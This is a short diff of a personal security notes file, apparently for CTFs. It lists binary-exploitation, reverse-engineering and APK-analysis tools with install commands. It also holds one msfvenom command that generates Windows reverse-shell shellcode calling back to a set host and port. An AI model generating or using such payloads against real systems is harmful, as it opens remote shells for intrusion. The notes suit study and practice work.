@@ -1,4 +1,20 @@
+Binary Exploitation
+> EASY : ltrace, strace
+Hopper:
+gdb or peda:
+IDA64
+radar2: sudo snap install radare2 --edge or sudo apt install radare2
+ghidra : sudo apt install openjdk-11-jdk | ./sudo ghidra
+objdump
+ 
+REVERSE ENGINEERING:
+immunity debugger, ollydbg, ged
+
+APK _ FORIENSICS:
+APKtool, jd_gui, dex2jar
+
 shell code generating command
 msfvenom -p windows/shell_reverse_tcp LHOST=92.168.116.138 LPORT=8080 EXITFUNC=thread -f python -a x86 --platform windows -b "\x00" -v buf
+
 
 
